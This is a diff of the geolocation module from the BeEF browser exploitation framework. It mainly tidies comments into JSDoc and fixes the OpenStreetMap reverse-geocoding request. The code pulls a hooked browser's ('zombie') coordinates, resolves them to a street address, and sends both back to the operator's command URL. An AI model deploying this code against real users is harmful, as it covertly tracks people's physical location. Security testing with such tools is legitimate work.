@@ -1,25 +1,30 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
-/*!
- * @literal object: beef.geolocation
- *
+/**
  * Provides functionalities to use the geolocation API.
+ * @namespace beef.geolocation
  */
+
 beef.geolocation = {
 
     /**
-     * check if browser supports the geolocation API
+     * Check if browser supports the geolocation API
+     * @return {boolean}
      */
     isGeolocationEnabled: function(){
 		return !!navigator.geolocation;
     },
 
-    /*
-     * given latitude/longitude retrieves exact street position of the zombie
+    /** 
+     * Given latitude/longitude retrieves exact street position of the zombie
+     * @param command_url
+     * @param command_id
+     * @param latitude
+     * @param longitude
      */
     getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
 
@@ -40,23 +45,26 @@ beef.geolocation = {
                 },
             success: function(data, status, xhr){
                 beef.debug("[geolocation.js] openstreetmap success");
-                var jsonResp = $j.parseJSON(data);
+                //var jsonResp = $j.parseJSON(data);
 
                 beef.net.send(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
 //                             + "&osm=" + encodeURI(jsonResp.display_name)
-                              + "&osm=tofix"
+                              + "&osm=" + data.display_name
                              + "&geoLocEnabled=True");
                 },
             type: "get",
-            url: "http://nominatim.openstreetmap.org/reverse?format=json&lat=" +
+	    dataType: "json",
+            url: "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" +
                 latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
         });
 
     },
 
-    /*
-     * retrieve latitude/longitude using the geolocation API
+    /**
+     * Retrieve latitude/longitude using the geolocation API
+     * @param command_url
+     * @param command_id
      */
     getGeolocation: function (command_url, command_id){
 
